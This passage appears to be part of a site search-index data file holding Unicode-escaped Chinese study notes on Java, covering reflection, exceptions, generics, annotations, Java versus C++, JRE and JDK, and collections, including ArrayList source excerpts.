Method \uFF1A\u53EF\u4EE5\u4F7F\u7528 invoke() \u65B9\u6CD5\u8C03\u7528\u4E0E Method \u5BF9\u8C61\u5173\u8054\u7684\u65B9\u6CD5\uFF1B
Constructor \uFF1A\u53EF\u4EE5\u7528 Constructor \u7684 newInstance() \u521B\u5EFA\u65B0\u7684\u5BF9\u8C61\u3002 \u53CD\u5C04\u7684\u4F18\u70B9\uFF1A \u53EF\u6269\u5C55\u6027 \uFF1A\u5E94\u7528\u7A0B\u5E8F\u53EF\u4EE5\u5229\u7528\u5168\u9650\u5B9A\u540D\u521B\u5EFA\u53EF\u6269\u5C55\u5BF9\u8C61\u7684\u5B9E\u4F8B\uFF0C\u6765\u4F7F\u7528\u6765\u81EA\u5916\u90E8\u7684\u7528\u6237\u81EA\u5B9A\u4E49\u7C7B\u3002
\u7C7B\u6D4F\u89C8\u5668\u548C\u53EF\u89C6\u5316\u5F00\u53D1\u73AF\u5883 \uFF1A\u4E00\u4E2A\u7C7B\u6D4F\u89C8\u5668\u9700\u8981\u53EF\u4EE5\u679A\u4E3E\u7C7B\u7684\u6210\u5458\u3002\u53EF\u89C6\u5316\u5F00\u53D1\u73AF\u5883\uFF08\u5982 IDE\uFF09\u53EF\u4EE5\u4ECE\u5229\u7528\u53CD\u5C04\u4E2D\u53EF\u7528\u7684\u7C7B\u578B\u4FE1\u606F\u4E2D\u53D7\u76CA\uFF0C\u4EE5\u5E2E\u52A9\u7A0B\u5E8F\u5458\u7F16\u5199\u6B63\u786E\u7684\u4EE3\u7801\u3002
\u8C03\u8BD5\u5668\u548C\u6D4B\u8BD5\u5DE5\u5177 \uFF1A \u8C03\u8BD5\u5668\u9700\u8981\u80FD\u591F\u68C0\u67E5\u4E00\u4E2A\u7C7B\u91CC\u7684\u79C1\u6709\u6210\u5458\u3002\u6D4B\u8BD5\u5DE5\u5177\u53EF\u4EE5\u5229\u7528\u53CD\u5C04\u6765\u81EA\u52A8\u5730\u8C03\u7528\u7C7B\u91CC\u5B9A\u4E49\u7684\u53EF\u88AB\u53D1\u73B0\u7684 API \u5B9A\u4E49\uFF0C\u4EE5\u786E\u4FDD\u4E00\u7EC4\u6D4B\u8BD5\u4E2D\u6709\u8F83\u9AD8\u7684\u4EE3\u7801\u8986\u76D6\u7387\u3002 \u53CD\u5C04\u7684\u7F3A\u70B9\uFF1A
\u5C3D\u7BA1\u53CD\u5C04\u975E\u5E38\u5F3A\u5927\uFF0C\u4F46\u4E5F\u4E0D\u80FD\u6EE5\u7528\u3002\u5982\u679C\u4E00\u4E2A\u529F\u80FD\u53EF\u4EE5\u4E0D\u7528\u53CD\u5C04\u5B8C\u6210\uFF0C\u90A3\u4E48\u6700\u597D\u5C31\u4E0D\u7528\u3002\u5728\u6211\u4EEC\u4F7F\u7528\u53CD\u5C04\u6280\u672F\u65F6\uFF0C\u4E0B\u9762\u51E0\u6761\u5185\u5BB9\u5E94\u8BE5\u7262\u8BB0\u4E8E\u5FC3\u3002 \u6027\u80FD\u5F00\u9500 \uFF1A\u53CD\u5C04\u6D89\u53CA\u4E86\u52A8\u6001\u7C7B\u578B\u7684\u89E3\u6790\uFF0C\u6240\u4EE5 JVM \u65E0\u6CD5\u5BF9\u8FD9\u4E9B\u4EE3\u7801\u8FDB\u884C\u4F18\u5316\u3002\u56E0\u6B64\uFF0C\u53CD\u5C04\u64CD\u4F5C\u7684\u6548\u7387\u8981\u6BD4\u90A3\u4E9B\u975E\u53CD\u5C04\u64CD\u4F5C\u4F4E\u5F97\u591A\u3002\u6211\u4EEC\u5E94\u8BE5\u907F\u514D\u5728\u7ECF\u5E38\u88AB\u6267\u884C\u7684\u4EE3\u7801\u6216\u5BF9\u6027\u80FD\u8981\u6C42\u5F88\u9AD8\u7684\u7A0B\u5E8F\u4E2D\u4F7F\u7528\u53CD\u5C04\u3002 \u5B89\u5168\u9650\u5236 \uFF1A\u4F7F\u7528\u53CD\u5C04\u6280\u672F\u8981\u6C42\u7A0B\u5E8F\u5FC5\u987B\u5728\u4E00\u4E2A\u6CA1\u6709\u5B89\u5168\u9650\u5236\u7684\u73AF\u5883\u4E2D\u8FD0\u884C\u3002\u5982\u679C\u4E00\u4E2A\u7A0B\u5E8F\u5FC5\u987B\u5728\u6709\u5B89\u5168\u9650\u5236\u7684\u73AF\u5883\u4E2D\u8FD0\u884C\uFF0C\u5982 Applet\uFF0C\u90A3\u4E48\u8FD9\u5C31\u662F\u4E2A\u95EE\u9898\u4E86\u3002 \u5185\u90E8\u66B4\u9732 \uFF1A\u7531\u4E8E\u53CD\u5C04\u5141\u8BB8\u4EE3\u7801\u6267\u884C\u4E00\u4E9B\u5728\u6B63\u5E38\u60C5\u51B5\u4E0B\u4E0D\u88AB\u5141\u8BB8\u7684\u64CD\u4F5C\uFF08\u6BD4\u5982\u8BBF\u95EE\u79C1\u6709\u7684\u5C5E\u6027\u548C\u65B9\u6CD5\uFF09\uFF0C\u6240\u4EE5\u4F7F\u7528\u53CD\u5C04\u53EF\u80FD\u4F1A\u5BFC\u81F4\u610F\u6599\u4E4B\u5916\u7684\u526F\u4F5C\u7528\uFF0C\u8FD9\u53EF\u80FD\u5BFC\u81F4\u4EE3\u7801\u529F\u80FD\u5931\u8C03\u5E76\u7834\u574F\u53EF\u79FB\u690D\u6027\u3002\u53CD\u5C04\u4EE3\u7801\u7834\u574F\u4E86\u62BD\u8C61\u6027\uFF0C\u56E0\u6B64\u5F53\u5E73\u53F0\u53D1\u751F\u6539\u53D8\u7684\u65F6\u5019\uFF0C\u4EE3\u7801\u7684\u884C\u4E3A\u5C31\u6709\u53EF\u80FD\u4E5F\u968F\u7740\u53D8\u5316\u3002 Trail: The Reflection API \u6DF1\u5165\u89E3\u6790 Java \u53CD\u5C04\uFF081\uFF09- \u57FA\u7840`},{header:"\u516B\u3001\u5F02\u5E38",slug:"\u516B\u3001\u5F02\u5E38",content:`Throwable \u53EF\u4EE5\u7528\u6765\u8868\u793A\u4EFB\u4F55\u53EF\u4EE5\u4F5C\u4E3A\u5F02\u5E38\u629B\u51FA\u7684\u7C7B\uFF0C\u5206\u4E3A\u4E24\u79CD\uFF1A Error \u548C Exception\u3002\u5176\u4E2D Error \u7528\u6765\u8868\u793A JVM \u65E0\u6CD5\u5904\u7406\u7684\u9519\u8BEF\uFF0CException \u5206\u4E3A\u4E24\u79CD\uFF1A \u53D7\u68C0\u5F02\u5E38 \uFF1A\u9700\u8981\u7528 try...catch... \u8BED\u53E5\u6355\u83B7\u5E76\u8FDB\u884C\u5904\u7406\uFF0C\u5E76\u4E14\u53EF\u4EE5\u4ECE\u5F02\u5E38\u4E2D\u6062\u590D\uFF1B
\u975E\u53D7\u68C0\u5F02\u5E38 \uFF1A\u662F\u7A0B\u5E8F\u8FD0\u884C\u65F6\u9519\u8BEF\uFF0C\u4F8B\u5982\u9664 0 \u4F1A\u5F15\u53D1 Arithmetic Exception\uFF0C\u6B64\u65F6\u7A0B\u5E8F\u5D29\u6E83\u5E76\u4E14\u65E0\u6CD5\u6062\u590D\u3002 ![img](https://cs-notes-1256109796.cos.ap-guangzhou.myqcloud.com/PPjwP.png" width="600) Java Exception Interview Questions and Answers Java\u63D0\u9AD8\u7BC7\u2014\u2014Java \u5F02\u5E38\u5904\u7406`},{header:"\u4E5D\u3001\u6CDB\u578B",slug:"\u4E5D\u3001\u6CDB\u578B",content:`public class Box<T> { // T stands for "Type" private T t; public void set(T t) { this.t = t; } public T get() { return t; }
} Java \u6CDB\u578B\u8BE6\u89E3
10 \u9053 Java \u6CDB\u578B\u9762\u8BD5\u9898`},{header:"\u5341\u3001\u6CE8\u89E3",slug:"\u5341\u3001\u6CE8\u89E3",content:`Java \u6CE8\u89E3\u662F\u9644\u52A0\u5728\u4EE3\u7801\u4E2D\u7684\u4E00\u4E9B\u5143\u4FE1\u606F\uFF0C\u7528\u4E8E\u4E00\u4E9B\u5DE5\u5177\u5728\u7F16\u8BD1\u3001\u8FD0\u884C\u65F6\u8FDB\u884C\u89E3\u6790\u548C\u4F7F\u7528\uFF0C\u8D77\u5230\u8BF4\u660E\u3001\u914D\u7F6E\u7684\u529F\u80FD\u3002\u6CE8\u89E3\u4E0D\u4F1A\u4E5F\u4E0D\u80FD\u5F71\u54CD\u4EE3\u7801\u7684\u5B9E\u9645\u903B\u8F91\uFF0C\u4EC5\u4EC5\u8D77\u5230\u8F85\u52A9\u6027\u7684\u4F5C\u7528\u3002
\u6CE8\u89E3 Annotation \u5B9E\u73B0\u539F\u7406\u4E0E\u81EA\u5B9A\u4E49\u6CE8\u89E3\u4F8B\u5B50`},{header:"\u5341\u4E00\u3001\u7279\u6027",slug:"\u5341\u4E00\u3001\u7279\u6027",content:""},{header:"Java \u5404\u7248\u672C\u7684\u65B0\u7279\u6027",slug:"java-\u5404\u7248\u672C\u7684\u65B0\u7279\u6027",content:`New highlights in Java SE 8 Lambda Expressions
Pipelines and Streams
Date and Time API
Default Methods
Type Annotations
Nashhorn JavaScript Engine
Concurrent Accumulators
Parallel operations
PermGen Error Removed New highlights in Java SE 7 Strings in Switch Statement
Type Inference for Generic Instance Creation
Multiple Exception Handling
Support for Dynamic Languages
Try with Resources
Java nio Package
Binary Literals, Underscore in literals
Diamond Syntax Difference between Java 1.8 and Java 1.7?
Java 8 \u7279\u6027`},{header:"Java \u4E0E C++ \u7684\u533A\u522B",slug:"java-\u4E0E-c-\u7684\u533A\u522B",content:`Java \u662F\u7EAF\u7CB9\u7684\u9762\u5411\u5BF9\u8C61\u8BED\u8A00\uFF0C\u6240\u6709\u7684\u5BF9\u8C61\u90FD\u7EE7\u627F\u81EA java.lang.Object\uFF0CC++ \u4E3A\u4E86\u517C\u5BB9 C \u5373\u652F\u6301\u9762\u5411\u5BF9\u8C61\u4E5F\u652F\u6301\u9762\u5411\u8FC7\u7A0B\u3002
Java \u901A\u8FC7\u865A\u62DF\u673A\u4ECE\u800C\u5B9E\u73B0\u8DE8\u5E73\u53F0\u7279\u6027\uFF0C\u4F46\u662F C++ \u4F9D\u8D56\u4E8E\u7279\u5B9A\u7684\u5E73\u53F0\u3002
Java \u6CA1\u6709\u6307\u9488\uFF0C\u5B83\u7684\u5F15\u7528\u53EF\u4EE5\u7406\u89E3\u4E3A\u5B89\u5168\u6307\u9488\uFF0C\u800C C++ \u5177\u6709\u548C C \u4E00\u6837\u7684\u6307\u9488\u3002
Java \u652F\u6301\u81EA\u52A8\u5783\u573E\u56DE\u6536\uFF0C\u800C C++ \u9700\u8981\u624B\u52A8\u56DE\u6536\u3002
Java \u4E0D\u652F\u6301\u591A\u91CD\u7EE7\u627F\uFF0C\u53EA\u80FD\u901A\u8FC7\u5B9E\u73B0\u591A\u4E2A\u63A5\u53E3\u6765\u8FBE\u5230\u76F8\u540C\u76EE\u7684\uFF0C\u800C C++ \u652F\u6301\u591A\u91CD\u7EE7\u627F\u3002
Java \u4E0D\u652F\u6301\u64CD\u4F5C\u7B26\u91CD\u8F7D\uFF0C\u867D\u7136\u53EF\u4EE5\u5BF9\u4E24\u4E2A String \u5BF9\u8C61\u6267\u884C\u52A0\u6CD5\u8FD0\u7B97\uFF0C\u4F46\u662F\u8FD9\u662F\u8BED\u8A00\u5185\u7F6E\u652F\u6301\u7684\u64CD\u4F5C\uFF0C\u4E0D\u5C5E\u4E8E\u64CD\u4F5C\u7B26\u91CD\u8F7D\uFF0C\u800C C++ \u53EF\u4EE5\u3002
Java \u7684 goto \u662F\u4FDD\u7559\u5B57\uFF0C\u4F46\u662F\u4E0D\u53EF\u7528\uFF0CC++ \u53EF\u4EE5\u4F7F\u7528 goto\u3002 What are the main differences between Java and C++?`},{header:"JRE or JDK",slug:"jre-or-jdk",content:`JRE\uFF1AJava Runtime Environment\uFF0CJava \u8FD0\u884C\u73AF\u5883\u7684\u7B80\u79F0\uFF0C\u4E3A Java \u7684\u8FD0\u884C\u63D0\u4F9B\u4E86\u6240\u9700\u7684\u73AF\u5883\u3002\u5B83\u662F\u4E00\u4E2A JVM \u7A0B\u5E8F\uFF0C\u4E3B\u8981\u5305\u62EC\u4E86 JVM \u7684\u6807\u51C6\u5B9E\u73B0\u548C\u4E00\u4E9B Java \u57FA\u672C\u7C7B\u5E93\u3002
JDK\uFF1AJava Development Kit\uFF0CJava \u5F00\u53D1\u5DE5\u5177\u5305\uFF0C\u63D0\u4F9B\u4E86 Java \u7684\u5F00\u53D1\u53CA\u8FD0\u884C\u73AF\u5883\u3002JDK \u662F Java \u5F00\u53D1\u7684\u6838\u5FC3\uFF0C\u96C6\u6210\u4E86 JRE \u4EE5\u53CA\u4E00\u4E9B\u5176\u5B83\u7684\u5DE5\u5177\uFF0C\u6BD4\u5982\u7F16\u8BD1 Java \u6E90\u7801\u7684\u7F16\u8BD1\u5668 javac \u7B49\u3002`},{header:"\u53C2\u8003\u8D44\u6599",slug:"\u53C2\u8003\u8D44\u6599",content:`Eckel B. Java \u7F16\u7A0B\u601D\u60F3[M]. \u673A\u68B0\u5DE5\u4E1A\u51FA\u7248\u793E, 2002.
Bloch J. Effective java[M]. Addison-Wesley Professional, 2017.`}]},{path:"/java/Java%20%E5%AE%B9%E5%99%A8.html",title:"Java \u5BB9\u5668",pathLocale:"/",contents:[{header:"Java \u5BB9\u5668",slug:"java-\u5BB9\u5668",content:`Java \u5BB9\u5668 \u4E00\u3001\u6982\u89C8 Collection
Map \u4E8C\u3001\u5BB9\u5668\u4E2D\u7684\u8BBE\u8BA1\u6A21\u5F0F \u8FED\u4EE3\u5668\u6A21\u5F0F
\u9002\u914D\u5668\u6A21\u5F0F \u4E09\u3001\u6E90\u7801\u5206\u6790 ArrayList
Vector
CopyOnWriteArrayList
LinkedList
HashMap
ConcurrentHashMap
LinkedHashMap
WeakHashMap \u53C2\u8003\u8D44\u6599`},{header:"\u4E00\u3001\u6982\u89C8",slug:"\u4E00\u3001\u6982\u89C8",content:"\u5BB9\u5668\u4E3B\u8981\u5305\u62EC Collection \u548C Map \u4E24\u79CD\uFF0CCollection \u5B58\u50A8\u7740\u5BF9\u8C61\u7684\u96C6\u5408\uFF0C\u800C Map \u5B58\u50A8\u7740\u952E\u503C\u5BF9\uFF08\u4E24\u4E2A\u5BF9\u8C61\uFF09\u7684\u6620\u5C04\u8868\u3002"},{header:"Collection",slug:"collection",content:""},{header:"1. Set",slug:"_1-set",content:"TreeSet\uFF1A\u57FA\u4E8E\u7EA2\u9ED1\u6811\u5B9E\u73B0\uFF0C\u652F\u6301\u6709\u5E8F\u6027\u64CD\u4F5C\uFF0C\u4F8B\u5982\u6839\u636E\u4E00\u4E2A\u8303\u56F4\u67E5\u627E\u5143\u7D20\u7684\u64CD\u4F5C\u3002\u4F46\u662F\u67E5\u627E\u6548\u7387\u4E0D\u5982 HashSet\uFF0CHashSet \u67E5\u627E\u7684\u65F6\u95F4\u590D\u6742\u5EA6\u4E3A O(1)\uFF0CTreeSet \u5219\u4E3A O(logN)\u3002 HashSet\uFF1A\u57FA\u4E8E\u54C8\u5E0C\u8868\u5B9E\u73B0\uFF0C\u652F\u6301\u5FEB\u901F\u67E5\u627E\uFF0C\u4F46\u4E0D\u652F\u6301\u6709\u5E8F\u6027\u64CD\u4F5C\u3002\u5E76\u4E14\u5931\u53BB\u4E86\u5143\u7D20\u7684\u63D2\u5165\u987A\u5E8F\u4FE1\u606F\uFF0C\u4E5F\u5C31\u662F\u8BF4\u4F7F\u7528 Iterator \u904D\u5386 HashSet \u5F97\u5230\u7684\u7ED3\u679C\u662F\u4E0D\u786E\u5B9A\u7684\u3002 LinkedHashSet\uFF1A\u5177\u6709 HashSet \u7684\u67E5\u627E\u6548\u7387\uFF0C\u5E76\u4E14\u5185\u90E8\u4F7F\u7528\u53CC\u5411\u94FE\u8868\u7EF4\u62A4\u5143\u7D20\u7684\u63D2\u5165\u987A\u5E8F\u3002"},{header:"2. List",slug:"_2-list",content:"ArrayList\uFF1A\u57FA\u4E8E\u52A8\u6001\u6570\u7EC4\u5B9E\u73B0\uFF0C\u652F\u6301\u968F\u673A\u8BBF\u95EE\u3002 Vector\uFF1A\u548C ArrayList \u7C7B\u4F3C\uFF0C\u4F46\u5B83\u662F\u7EBF\u7A0B\u5B89\u5168\u7684\u3002 LinkedList\uFF1A\u57FA\u4E8E\u53CC\u5411\u94FE\u8868\u5B9E\u73B0\uFF0C\u53EA\u80FD\u987A\u5E8F\u8BBF\u95EE\uFF0C\u4F46\u662F\u53EF\u4EE5\u5FEB\u901F\u5730\u5728\u94FE\u8868\u4E2D\u95F4\u63D2\u5165\u548C\u5220\u9664\u5143\u7D20\u3002\u4E0D\u4EC5\u5982\u6B64\uFF0CLinkedList \u8FD8\u53EF\u4EE5\u7528\u4F5C\u6808\u3001\u961F\u5217\u548C\u53CC\u5411\u961F\u5217\u3002"},{header:"3. Queue",slug:"_3-queue",content:"LinkedList\uFF1A\u53EF\u4EE5\u7528\u5B83\u6765\u5B9E\u73B0\u53CC\u5411\u961F\u5217\u3002 PriorityQueue\uFF1A\u57FA\u4E8E\u5806\u7ED3\u6784\u5B9E\u73B0\uFF0C\u53EF\u4EE5\u7528\u5B83\u6765\u5B9E\u73B0\u4F18\u5148\u961F\u5217\u3002"},{header:"Map",slug:"map",content:"TreeMap\uFF1A\u57FA\u4E8E\u7EA2\u9ED1\u6811\u5B9E\u73B0\u3002 HashMap\uFF1A\u57FA\u4E8E\u54C8\u5E0C\u8868\u5B9E\u73B0\u3002 HashTable\uFF1A\u548C HashMap \u7C7B\u4F3C\uFF0C\u4F46\u5B83\u662F\u7EBF\u7A0B\u5B89\u5168\u7684\uFF0C\u8FD9\u610F\u5473\u7740\u540C\u4E00\u65F6\u523B\u591A\u4E2A\u7EBF\u7A0B\u540C\u65F6\u5199\u5165 HashTable \u4E0D\u4F1A\u5BFC\u81F4\u6570\u636E\u4E0D\u4E00\u81F4\u3002\u5B83\u662F\u9057\u7559\u7C7B\uFF0C\u4E0D\u5E94\u8BE5\u53BB\u4F7F\u7528\u5B83\uFF0C\u800C\u662F\u4F7F\u7528 ConcurrentHashMap \u6765\u652F\u6301\u7EBF\u7A0B\u5B89\u5168\uFF0CConcurrentHashMap \u7684\u6548\u7387\u4F1A\u66F4\u9AD8\uFF0C\u56E0\u4E3A ConcurrentHashMap \u5F15\u5165\u4E86\u5206\u6BB5\u9501\u3002 LinkedHashMap\uFF1A\u4F7F\u7528\u53CC\u5411\u94FE\u8868\u6765\u7EF4\u62A4\u5143\u7D20\u7684\u987A\u5E8F\uFF0C\u987A\u5E8F\u4E3A\u63D2\u5165\u987A\u5E8F\u6216\u8005\u6700\u8FD1\u6700\u5C11\u4F7F\u7528\uFF08LRU\uFF09\u987A\u5E8F\u3002"},{header:"\u4E8C\u3001\u5BB9\u5668\u4E2D\u7684\u8BBE\u8BA1\u6A21\u5F0F",slug:"\u4E8C\u3001\u5BB9\u5668\u4E2D\u7684\u8BBE\u8BA1\u6A21\u5F0F",content:""},{header:"\u8FED\u4EE3\u5668\u6A21\u5F0F",slug:"\u8FED\u4EE3\u5668\u6A21\u5F0F",content:`Collection \u7EE7\u627F\u4E86 Iterable \u63A5\u53E3\uFF0C\u5176\u4E2D\u7684 iterator() \u65B9\u6CD5\u80FD\u591F\u4EA7\u751F\u4E00\u4E2A Iterator \u5BF9\u8C61\uFF0C\u901A\u8FC7\u8FD9\u4E2A\u5BF9\u8C61\u5C31\u53EF\u4EE5\u8FED\u4EE3\u904D\u5386 Collection \u4E2D\u7684\u5143\u7D20\u3002
\u4ECE JDK 1.5 \u4E4B\u540E\u53EF\u4EE5\u4F7F\u7528 foreach \u65B9\u6CD5\u6765\u904D\u5386\u5B9E\u73B0\u4E86 Iterable \u63A5\u53E3\u7684\u805A\u5408\u5BF9\u8C61\u3002
List<String> list = new ArrayList<>();
list.add("a");
list.add("b");
for (String item : list) { System.out.println(item);
}`},{header:"\u9002\u914D\u5668\u6A21\u5F0F",slug:"\u9002\u914D\u5668\u6A21\u5F0F",content:`java.util.Arrays#asList() \u53EF\u4EE5\u628A\u6570\u7EC4\u7C7B\u578B\u8F6C\u6362\u4E3A List \u7C7B\u578B\u3002
@SafeVarargs
public static <T> List<T> asList(T... a)
\u5E94\u8BE5\u6CE8\u610F\u7684\u662F asList() \u7684\u53C2\u6570\u4E3A\u6CDB\u578B\u7684\u53D8\u957F\u53C2\u6570\uFF0C\u4E0D\u80FD\u4F7F\u7528\u57FA\u672C\u7C7B\u578B\u6570\u7EC4\u4F5C\u4E3A\u53C2\u6570\uFF0C\u53EA\u80FD\u4F7F\u7528\u76F8\u5E94\u7684\u5305\u88C5\u7C7B\u578B\u6570\u7EC4\u3002
Integer[] arr = {1, 2, 3};
List list = Arrays.asList(arr);
\u4E5F\u53EF\u4EE5\u4F7F\u7528\u4EE5\u4E0B\u65B9\u5F0F\u8C03\u7528 asList()\uFF1A
List list = Arrays.asList(1, 2, 3);`},{header:"\u4E09\u3001\u6E90\u7801\u5206\u6790",slug:"\u4E09\u3001\u6E90\u7801\u5206\u6790",content:`\u5982\u679C\u6CA1\u6709\u7279\u522B\u8BF4\u660E\uFF0C\u4EE5\u4E0B\u6E90\u7801\u5206\u6790\u57FA\u4E8E JDK 1.8\u3002
\u5728 IDEA \u4E2D double shift \u8C03\u51FA Search EveryWhere\uFF0C\u67E5\u627E\u6E90\u7801\u6587\u4EF6\uFF0C\u627E\u5230\u4E4B\u540E\u5C31\u53EF\u4EE5\u9605\u8BFB\u6E90\u7801\u3002`},{header:"ArrayList",slug:"arraylist",content:""},{header:"1. \u6982\u89C8",slug:"_1-\u6982\u89C8",content:`\u56E0\u4E3A ArrayList \u662F\u57FA\u4E8E\u6570\u7EC4\u5B9E\u73B0\u7684\uFF0C\u6240\u4EE5\u652F\u6301\u5FEB\u901F\u968F\u673A\u8BBF\u95EE\u3002RandomAccess \u63A5\u53E3\u6807\u8BC6\u7740\u8BE5\u7C7B\u652F\u6301\u5FEB\u901F\u968F\u673A\u8BBF\u95EE\u3002
public class ArrayList<E> extends AbstractList<E> implements List<E>, RandomAccess, Cloneable, java.io.Serializable
\u6570\u7EC4\u7684\u9ED8\u8BA4\u5927\u5C0F\u4E3A 10\u3002
private static final int DEFAULT_CAPACITY = 10;`},{header:"2. \u6269\u5BB9",slug:"_2-\u6269\u5BB9",content:`\u6DFB\u52A0\u5143\u7D20\u65F6\u4F7F\u7528 ensureCapacityInternal() \u65B9\u6CD5\u6765\u4FDD\u8BC1\u5BB9\u91CF\u8DB3\u591F\uFF0C\u5982\u679C\u4E0D\u591F\u65F6\uFF0C\u9700\u8981\u4F7F\u7528 grow() \u65B9\u6CD5\u8FDB\u884C\u6269\u5BB9\uFF0C\u65B0\u5BB9\u91CF\u7684\u5927\u5C0F\u4E3A oldCapacity + (oldCapacity >> 1)\uFF0C\u5373 oldCapacity+oldCapacity/2\u3002\u5176\u4E2D oldCapacity >> 1 \u9700\u8981\u53D6\u6574\uFF0C\u6240\u4EE5\u65B0\u5BB9\u91CF\u5927\u7EA6\u662F\u65E7\u5BB9\u91CF\u7684 1.5 \u500D\u5DE6\u53F3\u3002\uFF08oldCapacity \u4E3A\u5076\u6570\u5C31\u662F 1.5 \u500D\uFF0C\u4E3A\u5947\u6570\u5C31\u662F 1.5 \u500D-0.5\uFF09
\u6269\u5BB9\u64CD\u4F5C\u9700\u8981\u8C03\u7528 Arrays.copyOf() \u628A\u539F\u6570\u7EC4\u6574\u4E2A\u590D\u5236\u5230\u65B0\u6570\u7EC4\u4E2D\uFF0C\u8FD9\u4E2A\u64CD\u4F5C\u4EE3\u4EF7\u5F88\u9AD8\uFF0C\u56E0\u6B64\u6700\u597D\u5728\u521B\u5EFA ArrayList \u5BF9\u8C61\u65F6\u5C31\u6307\u5B9A\u5927\u6982\u7684\u5BB9\u91CF\u5927\u5C0F\uFF0C\u51CF\u5C11\u6269\u5BB9\u64CD\u4F5C\u7684\u6B21\u6570\u3002
public boolean add(E e) { ensureCapacityInternal(size + 1); // Increments modCount!! elementData[size++] = e; return true;
} private void ensureCapacityInternal(int minCapacity) { if (elementData == DEFAULTCAPACITY_EMPTY_ELEMENTDATA) { minCapacity = Math.max(DEFAULT_CAPACITY, minCapacity); } ensureExplicitCapacity(minCapacity);
} private void ensureExplicitCapacity(int minCapacity) { modCount++; // overflow-conscious code if (minCapacity - elementData.length > 0) grow(minCapacity);
} private void grow(int minCapacity) { // overflow-conscious code int oldCapacity = elementData.length; int newCapacity = oldCapacity + (oldCapacity >> 1); if (newCapacity - minCapacity < 0) newCapacity = minCapacity; if (newCapacity - MAX_ARRAY_SIZE > 0) newCapacity = hugeCapacity(minCapacity); // minCapacity is usually close to size, so this is a win: elementData = Arrays.copyOf(elementData, newCapacity);
}`},{header:"3. \u5220\u9664\u5143\u7D20",slug:"_3-\u5220\u9664\u5143\u7D20",content:`\u9700\u8981\u8C03\u7528 System.arraycopy() \u5C06 index+1 \u540E\u9762\u7684\u5143\u7D20\u90FD\u590D\u5236\u5230 index \u4F4D\u7F6E\u4E0A\uFF0C\u8BE5\u64CD\u4F5C\u7684\u65F6\u95F4\u590D\u6742\u5EA6\u4E3A O(N)\uFF0C\u53EF\u4EE5\u770B\u5230 ArrayList \u5220\u9664\u5143\u7D20\u7684\u4EE3\u4EF7\u662F\u975E\u5E38\u9AD8\u7684\u3002
public E remove(int index) { rangeCheck(index); modCount++; E oldValue = elementData(index); int numMoved = size - index - 1; if (numMoved > 0) System.arraycopy(elementData, index+1, elementData, index, numMoved); elementData[--size] = null; // clear to let GC do its work return oldValue;
}`},{header:"4. \u5E8F\u5217\u5316",slug:"_4-\u5E8F\u5217\u5316",content:`ArrayList \u57FA\u4E8E\u6570\u7EC4\u5B9E\u73B0\uFF0C\u5E76\u4E14\u5177\u6709\u52A8\u6001\u6269\u5BB9\u7279\u6027\uFF0C\u56E0\u6B64\u4FDD\u5B58\u5143\u7D20\u7684\u6570\u7EC4\u4E0D\u4E00\u5B9A\u90FD\u4F1A\u88AB\u4F7F\u7528\uFF0C\u90A3\u4E48\u5C31\u6CA1\u5FC5\u8981\u5168\u90E8\u8FDB\u884C\u5E8F\u5217\u5316\u3002
\u4FDD\u5B58\u5143\u7D20\u7684\u6570\u7EC4 elementData \u4F7F\u7528 transient \u4FEE\u9970\uFF0C\u8BE5\u5173\u952E\u5B57\u58F0\u660E\u6570\u7EC4\u9ED8\u8BA4\u4E0D\u4F1A\u88AB\u5E8F\u5217\u5316\u3002
transient Object[] elementData; // non-private to simplify nested class access
ArrayList \u5B9E\u73B0\u4E86 writeObject() \u548C readObject() \u6765\u63A7\u5236\u53EA\u5E8F\u5217\u5316\u6570\u7EC4\u4E2D\u6709\u5143\u7D20\u586B\u5145\u90A3\u90E8\u5206\u5185\u5BB9\u3002
private void readObject(java.io.ObjectInputStream s) throws java.io.IOException, ClassNotFoundException { elementData = EMPTY_ELEMENTDATA; // Read in size, and any hidden stuff s.defaultReadObject(); // Read in capacity s.readInt(); // ignored if (size > 0) { // be like clone(), allocate array based upon size not capacity ensureCapacityInternal(size); Object[] a = elementData; // Read in all elements in the proper order. for (int i=0; i<size; i++) { a[i] = s.readObject(); } }
}
private void writeObject(java.io.ObjectOutputStream s) throws java.io.IOException{ // Write out element count, and any hidden stuff int expectedModCount = modCount; s.defaultWriteObject(); // Write out size as capacity for behavioural compatibility with clone() s.writeInt(size); // Write out all elements in the proper order. for (int i=0; i<size; i++) { s.writeObject(elementData[i]); } if (modCount != expectedModCount) { throw new ConcurrentModificationException(); }
}
\u5E8F\u5217\u5316\u65F6\u9700\u8981\u4F7F\u7528 ObjectOutputStream \u7684 writeObject() \u5C06\u5BF9\u8C61\u8F6C\u6362\u4E3A\u5B57\u8282\u6D41\u5E76\u8F93\u51FA\u3002\u800C writeObject() \u65B9\u6CD5\u5728\u4F20\u5165\u7684\u5BF9\u8C61\u5B58\u5728 writeObject() \u7684\u65F6\u5019\u4F1A\u53BB\u53CD\u5C04\u8C03\u7528\u8BE5\u5BF9\u8C61\u7684 writeObject() \u6765\u5B9E\u73B0\u5E8F\u5217\u5316\u3002\u53CD\u5E8F\u5217\u5316\u4F7F\u7528\u7684\u662F ObjectInputStream \u7684 readObject() \u65B9\u6CD5\uFF0C\u539F\u7406\u7C7B\u4F3C\u3002
ArrayList list = new ArrayList();
ObjectOutputStream oos = new ObjectOutputStream(new FileOutputStream(file));
oos.writeObject(list);`},{header:"5. Fail-Fast",slug:"_5-fail-fast",content:`modCount \u7528\u6765\u8BB0\u5F55 ArrayList \u7ED3\u6784\u53D1\u751F\u53D8\u5316\u7684\u6B21\u6570\u3002\u7ED3\u6784\u53D1\u751F\u53D8\u5316\u662F\u6307\u6DFB\u52A0\u6216\u8005\u5220\u9664\u81F3\u5C11\u4E00\u4E2A\u5143\u7D20\u7684\u6240\u6709\u64CD\u4F5C\uFF0C\u6216\u8005\u662F\u8C03\u6574\u5185\u90E8\u6570\u7EC4\u7684\u5927\u5C0F\uFF0C\u4EC5\u4EC5\u53EA\u662F\u8BBE\u7F6E\u5143\u7D20\u7684\u503C\u4E0D\u7B97\u7ED3\u6784\u53D1\u751F\u53D8\u5316\u3002
